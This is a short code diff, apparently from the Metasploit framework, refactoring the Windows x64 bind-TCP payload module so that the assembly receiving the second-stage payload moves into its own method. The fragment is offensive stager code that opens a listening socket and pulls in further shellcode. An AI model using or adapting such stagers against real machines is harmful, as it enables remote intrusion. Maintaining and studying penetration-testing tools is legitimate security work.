@@ -68,6 +68,7 @@ module Payload::Windows::BindTcp_x64
       start:
         pop rbp              ; pop off the address of 'api_call' for calling later.
       #{asm_bind_tcp(opts)}
+      #{asm_block_recv(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
@@ -204,8 +205,12 @@ module Payload::Windows::BindTcp_x64
     ^
 
     asm << asm_send_uuid if include_send_uuid
+    return asm
+  end
 
-    asm << %Q^
+  def asm_block_recv(opts={})
+
+    asm = %Q^
       recv:
         ; Receive the size of the incoming second stage...
         sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
